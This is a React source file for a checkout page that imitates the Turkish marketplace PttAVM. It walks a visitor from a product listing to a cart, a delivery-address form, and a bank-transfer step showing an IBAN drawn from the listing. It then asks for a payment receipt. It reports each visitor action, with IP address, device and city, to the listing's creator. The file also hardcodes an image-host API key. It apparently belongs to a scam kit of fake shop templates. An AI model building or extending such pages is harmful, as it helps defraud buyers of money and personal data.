'use client';

import { useState, useRef, useEffect } from 'react';

interface PttAvmTemplateProps {
    data: any;
    idOrSlug: string;
}

export default function PttAvmTemplate({ data, idOrSlug }: PttAvmTemplateProps) {
    const [mevcutAdim, setMevcutAdim] = useState(1);
    const [form, setForm] = useState({
        aliciAd: '',
        aliciSoyad: '',
        aliciMail: '',
        aliciIl: '',
        aliciIlce: '',
        aliciMahalle: '',
        aliciTel: '',
        aliciTC: '',
        aliciAdres: ''
    });
    
    const [turkeyData, setTurkeyData] = useState<any[]>([]);
    const [secilenDekontDosyasi, setSecilenDekontDosyasi] = useState<File | null>(null);
    const [isProcessing, setIsProcessing] = useState(false);
    const [isCompleted, setIsCompleted] = useState(false);
    
    const fileInputRef = useRef<HTMLInputElement>(null);

    useEffect(() => {
        const fetchTurkeyData = async () => {
            try {
                const response = await fetch("https://turkiyeapi.dev/api/v1/provinces");
                const json = await response.json();
                const sorted = json.data.sort((a: any, b: any) => a.name.localeCompare(b.name));
                setTurkeyData(sorted);
            } catch (error) {}
        };
        fetchTurkeyData();
        logAction("İlana Giriş Yaptı (PttAVM)", "Eleman vitrini inceliyor.");
    }, []);

    const logAction = async (aksiyon: string, detay: string = "") => {
        if (!data) return;
        try {
            let ip = "Bilinmiyor";
            try {
                const ipRes = await fetch('https://api.ipify.org?format=json');
                const ipData = await ipRes.json();
                ip = ipData.ip;
            } catch (e) {}

            const ua = navigator.userAgent;
            let cihaz = "Diğer/PC";
            if (/iPhone|iPad|iPod/i.test(ua)) cihaz = "Apple iOS";
            else if (/Android/i.test(ua)) cihaz = "Android";

            await fetch(`/api/log-ekle`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    saticiId: data.olusturanMusteri,
                    ilanBasligi: data.urunAdi || "Bilinmiyor",
                    saticiAdi: data.saticiAdi || "Bilinmiyor",
                    fiyat: (data.fiyat || 0) + " TL",
                    sablon: "Şablon 2 (Mavi - PttAVM)",
                    aksiyon,
                    detay,
                    ip,
                    cihaz,
                    tarih: new Date().toLocaleDateString('tr-TR'),
                    saat: new Date().toLocaleTimeString('tr-TR', { hour: '2-digit', minute: '2-digit' })
                })
            });
        } catch (e) {}
    };

    const formatPrice = (num: number) => {
        return new Intl.NumberFormat('tr-TR', { 
            minimumFractionDigits: 0, 
            maximumFractionDigits: 0 
        }).format(num) + " TL";
    };

    const handleNext = async () => {
        if (mevcutAdim === 1) {
            setMevcutAdim(2);
            logAction("Hemen Al'a Bastı", "Sepet ekranına geçti.");
        } else if (mevcutAdim === 2) {
            setMevcutAdim(3);
            logAction("Sepeti Onayladı", "Teslimat bilgileri ekranına geçti.");
        } else if (mevcutAdim === 3) {
            if (!form.aliciAd || !form.aliciSoyad || !form.aliciTel || !form.aliciIl || !form.aliciIlce || !form.aliciAdres) {
                alert("Lütfen zorunlu alanları doldurun.");
                return;
            }
            setMevcutAdim(4);
            logAction("Adres Kaydetti", `Ödeme ekranına geçti. Şehir: ${form.aliciIl}`);
        } else if (mevcutAdim === 4) {
            if (!secilenDekontDosyasi) {
                alert("Lütfen ödeme dekontunuzu yükleyin.");
                return;
            }
            handleCompleteOrder();
        }
        window.scrollTo(0, 0);
    };

    const handleCompleteOrder = async () => {
        setIsProcessing(true);
        try {
            const apiKey = "De087c486b0f12c525ef31688d64dcf0";
            const formData = new FormData();
            formData.append("image", secilenDekontDosyasi!);
            
            const imgRes = await fetch(`https://api.imgbb.com/1/upload?key=${apiKey}`, { method: "POST", body: formData });
            const imgData = await imgRes.json();
            
            if (!imgData.success) throw new Error("Dekont yüklenemedi.");
            
            const dekontUrl = imgData.data.url;
            const tamAdres = `${form.aliciIl} / ${form.aliciIlce} - ${form.aliciMahalle} - ${form.aliciAdres}`;

            const res = await fetch('/api/siparis-tamamla', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    ilanId: data.docId || idOrSlug,
                    saticiId: data.olusturanMusteri,
                    ilanBasligi: data.urunAdi,
                    aliciAd: `${form.aliciAd} ${form.aliciSoyad}`,
                    aliciTel: form.aliciTel,
                    aliciAdres: tamAdres,
                    dekontUrl
                })
            });

            if (res.ok) {
                logAction("BAŞARILI BİTİŞ (PttAVM)", "Sipariş tamamlandı.");
                setIsCompleted(true);
            } else {
                throw new Error("Sipariş işlenemedi.");
            }
        } catch (e: any) {
            alert(e.message || "Bir hata oluştu.");
        } finally {
            setIsProcessing(false);
        }
    };

    const safFiyat = parseFloat(data.fiyat) || 0;

    return (
        <div className="ptt-body">
            <style jsx global>{`
                :root {
                    --ptt-yellow: #fcd55c; 
                    --ptt-blue: #46b3cf; 
                    --ptt-price-green: #00a651;
                    --ptt-text-dark: #333333;
                    --ptt-text-gray: #666666;
                    --ptt-border: #e0e0e0;
                }
                .ptt-body {
                    background-color: #f5f5f5;
                    color: var(--ptt-text-dark);
                    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
                    display: flex;
                    justify-content: center;
                    margin: 0;
                    padding: 0;
                    width: 100%;
                }
                .app-container {
                    width: 100%;
                    max-width: 480px;
                    background: #fff;
                    min-height: 100vh;
                    position: relative;
                    padding-bottom: 80px;
                }
                .header { display: flex; justify-content: space-between; align-items: center; padding: 15px 20px; background-color: #fff; border-bottom: 1px solid #f0f0f0; }
                .logo-text { font-size: 22px; font-weight: 800; color: #0059a3; letter-spacing: -0.5px; }
                .logo-text span { color: var(--ptt-yellow); }
                
                .gallery-wrap { display: flex; overflow-x: auto; scroll-snap-type: x mandatory; background: #fff; scrollbar-width: none; }
                .gallery-wrap::-webkit-scrollbar { display: none; }
                .gallery-wrap img { width: 100%; height: 320px; flex-shrink: 0; object-fit: contain; scroll-snap-align: center; }
                
                .product-details { padding: 15px; background: #fff; border-bottom: 5px solid #f5f5f5; }
                .product-title { font-size: 18px; font-weight: 400; color: var(--ptt-text-dark); margin-bottom: 5px; line-height: 1.3; }
                .product-price { font-size: 32px; font-weight: 700; color: var(--ptt-price-green); margin-bottom: 10px; }
                
                .badge-kargo { display: inline-flex; align-items: center; gap: 5px; background-color: #e0f2f5; color: #008c99; padding: 6px 12px; border-radius: 20px; font-size: 13px; font-weight: 600; margin-bottom: 10px; }
                
                .ozellik-table { width: 100%; border-collapse: collapse; margin-top: 10px; }
                .ozellik-table tr { border-bottom: 1px solid #f5f5f5; }
                .ozellik-table td { padding: 10px 0; font-size: 13px; }
                .ozellik-table td:first-child { color: var(--ptt-text-dark); width: 40%; }
                .ozellik-table td:last-child { color: var(--ptt-text-dark); font-weight: 500; text-align: right; }

                .cart-card { background: #fff; margin: 15px; border-radius: 8px; border: 1px solid #eee; overflow: hidden; }
                .cart-store-header { padding: 12px 15px; background: #fafafa; border-bottom: 1px solid #eee; display: flex; justify-content: space-between; font-size: 13px; color: #666; }
                .cart-item-row { padding: 15px; display: flex; gap: 15px; }
                .cart-item-img { width: 80px; height: 80px; border-radius: 6px; object-fit: cover; border: 1px solid #eee; }
                
                .summary-card { background: #fff; margin: 15px; padding: 15px; border-radius: 8px; border: 1px solid #eee; }
                .summary-row { display: flex; justify-content: space-between; font-size: 13px; color: #666; margin-bottom: 12px; }
                .summary-row.total { border-top: 1px solid #eee; padding-top: 15px; font-size: 16px; font-weight: bold; color: var(--ptt-price-green); }

                .form-card { background: #fff; margin: 0 15px 15px 15px; border-radius: 8px; border: 1px solid #ddd; overflow: hidden; }
                .form-input-group { border-bottom: 1px solid #eee; }
                .form-input-group input, .form-input-group select, .form-input-group textarea { width: 100%; border: none; padding: 15px; font-size: 14px; outline: none; background: transparent; }
                
                .iban-box { background: #f9f9f9; padding: 20px; border-bottom: 1px solid #eee; margin: 15px; border-radius: 8px; border: 1px solid #eee; }
                .iban-row { display: flex; justify-content: space-between; align-items: center; margin-bottom: 15px; }
                .iban-row h3 { font-size: 11px; color: #666; text-transform: uppercase; }
                .iban-row p { font-size: 15px; font-weight: bold; }
                
                .sticky-footer { position: fixed; bottom: 0; width: 100%; max-width: 480px; background: #fff; padding: 12px 15px; border-top: 1px solid #e0e0e0; z-index: 100; }
                .btn-ptt { width: 100%; background-color: var(--ptt-yellow); color: var(--ptt-text-dark); border: none; padding: 15px; border-radius: 6px; font-size: 16px; font-weight: 600; cursor: pointer; }
                .btn-ptt.blue { background-color: var(--ptt-blue); color: #fff; }
            `}</style>

            <div className="app-container">
                <div className="header">
                    <div className="logo-text">Ptt<span>AVM</span></div>
                </div>

                {isCompleted ? (
                    <div style={{ textAlign: 'center', padding: '60px 20px' }}>
                        <div style={{ fontSize: '50px', marginBottom: '20px' }}>✅</div>
                        <h2 style={{ color: '#0059a3', marginBottom: '10px' }}>Sipariş Alındı!</h2>
                        <p style={{ color: '#666', fontSize: '14px', lineHeight: '1.6' }}>Dekontunuz incelendikten sonra ürününüz kargoya verilecektir. Bizi tercih ettiğiniz için teşekkürler.</p>
                    </div>
                ) : (
                    <>
                        {mevcutAdim === 1 && (
                            <div className="step-1">
                                <div className="gallery-wrap">
                                    {(data.resimler && data.resimler.length > 0) ? 
                                        data.resimler.map((img: string, i: number) => <img key={i} src={img} alt="" />) : 
                                        <img src={data.anaResim} alt="" />
                                    }
                                </div>
                                <div className="product-details">
                                    <h1 className="product-title">{data.urunAdi}</h1>
                                    <div className="product-price">{formatPrice(safFiyat)}</div>
                                    <div className="badge-kargo">🚚 1 gün içinde kargoda</div>
                                    <div style={{ fontSize: '14px', color: '#666', marginTop: '15px' }}>{data.urunAciklamasi}</div>
                                    
                                    <table className="ozellik-table">
                                        <tbody>
                                            {Array.isArray(data.dinamikOzellikler) && data.dinamikOzellikler.map((item: any, i: number) => (
                                                <tr key={i}>
                                                    <td>{item.anahtar}</td>
                                                    <td>{item.deger}</td>
                                                </tr>
                                            ))}
                                            <tr><td>Satıcı</td><td>{data.saticiAdi}</td></tr>
                                            <tr><td>Konum</td><td>{data.sehir}</td></tr>
                                        </tbody>
                                    </table>
                                </div>
                            </div>
                        )}

                        {mevcutAdim === 2 && (
                            <div className="step-2">
                                <div className="cart-card">
                                    <div className="cart-store-header"><span>Mağaza: <b>PttAVM</b></span><span style={{ color: '#00a651', fontWeight: 'bold' }}>Kargo Bedava</span></div>
                                    <div className="cart-item-row">
                                        <img src={data.anaResim || data.resimler?.[0]} className="cart-item-img" alt="" />
                                        <div className="cart-item-info">
                                            <div style={{ fontSize: '14px', fontWeight: 'bold' }}>{data.urunAdi}</div>
                                            <div style={{ fontSize: '16px', color: '#00a651', fontWeight: 'bold', marginTop: '10px' }}>{formatPrice(safFiyat)}</div>
                                        </div>
                                    </div>
                                </div>
                                <div className="summary-card">
                                    <div className="summary-row"><span>Ara Toplam</span><span>{formatPrice(safFiyat)}</span></div>
                                    <div className="summary-row"><span>Kargo</span><span style={{ color: '#008c99' }}>Ücretsiz</span></div>
                                    <div className="summary-row total"><span>Toplam</span><span>{formatPrice(safFiyat)}</span></div>
                                </div>
                            </div>
                        )}

                        {mevcutAdim === 3 && (
                            <div className="step-3">
                                <div style={{ padding: '20px 15px', fontSize: '16px', fontWeight: 'bold', color: '#0059a3' }}>Teslimat Bilgileri</div>
                                <div className="form-card">
                                    <div className="form-input-group"><input type="text" placeholder="Ad *" value={form.aliciAd} onChange={e => setForm({...form, aliciAd: e.target.value})} /></div>
                                    <div className="form-input-group"><input type="text" placeholder="Soyad *" value={form.aliciSoyad} onChange={e => setForm({...form, aliciSoyad: e.target.value})} /></div>
                                    <div className="form-input-group"><input type="tel" placeholder="Telefon *" value={form.aliciTel} onChange={e => setForm({...form, aliciTel: e.target.value})} /></div>
                                    <div className="form-input-group">
                                        <select value={form.aliciIl} onChange={e => setForm({...form, aliciIl: e.target.value, aliciIlce: ''})}>
                                            <option value="">İl seçin *</option>
                                            {turkeyData.map(il => <option key={il.id} value={il.name}>{il.name}</option>)}
                                        </select>
                                    </div>
                                    <div className="form-input-group">
                                        <select value={form.aliciIlce} onChange={e => setForm({...form, aliciIlce: e.target.value})} disabled={!form.aliciIl}>
                                            <option value="">İlçe seçin *</option>
                                            {form.aliciIl && turkeyData.find(il => il.name === form.aliciIl)?.districts.map((d: any) => (
                                                <option key={d.id} value={d.name}>{d.name}</option>
                                            ))}
                                        </select>
                                    </div>
                                    <div className="form-input-group"><textarea placeholder="Adres *" value={form.aliciAdres} onChange={e => setForm({...form, aliciAdres: e.target.value})}></textarea></div>
                                </div>
                            </div>
                        )}

                        {mevcutAdim === 4 && (
                            <div className="step-4">
                                <div style={{ padding: '20px 15px', fontSize: '16px', fontWeight: 'bold', color: '#0059a3' }}>Banka Havalesi / EFT</div>
                                <div className="iban-box">
                                    <div className="iban-row">
                                        <div><h3>Alıcı IBAN</h3><p>{data.iban?.split('-')[0].trim() || 'TR00...'}</p></div>
                                        <button className="copy-btn" onClick={() => { navigator.clipboard.writeText(data.iban?.split('-')[0].trim()); alert('IBAN Kopyalandı'); }}>Kopyala</button>
                                    </div>
                                    <div className="iban-row" style={{ marginBottom: 0 }}>
                                        <div><h3>Alıcı Ad Soyad</h3><p>{data.iban?.split('-')[1]?.trim() || data.saticiAdi}</p></div>
                                        <button className="copy-btn" onClick={() => { navigator.clipboard.writeText(data.iban?.split('-')[1]?.trim() || data.saticiAdi); alert('İsim Kopyalandı'); }}>Kopyala</button>
                                    </div>
                                </div>
                                
                                <input type="file" ref={fileInputRef} accept="image/*" style={{ display: 'none' }} onChange={e => setSecilenDekontDosyasi(e.target.files?.[0] || null)} />
                                <div className="upload-box" style={{ border: '2px dashed #ccc', padding: '30px', textAlign: 'center', margin: '15px', borderRadius: '8px', background: '#fafafa', cursor: 'pointer' }} onClick={() => fileInputRef.current?.click()}>
                                    {secilenDekontDosyasi ? `Dosya Seçildi: ${secilenDekontDosyasi.name}` : 'Dekont Yüklemek İçin Tıklayın'}
                                </div>
                                {isProcessing && <div style={{ textAlign: 'center', padding: '10px', color: '#0059a3', fontWeight: 'bold' }}>İşleminiz yapılıyor...</div>}
                            </div>
                        )}

                        <div className="sticky-footer">
                            <button className={`btn-ptt ${mevcutAdim >= 2 ? 'blue' : ''}`} onClick={handleNext} disabled={isProcessing}>
                                {mevcutAdim === 1 ? 'Hemen Al' : 
                                 mevcutAdim === 2 ? 'Siparişi Onayla' : 
                                 mevcutAdim === 3 ? 'Ödemeye Geç' : 'Siparişi Tamamla'}
                            </button>
                        </div>
                    </>
                )}
            </div>
        </div>
    );
}
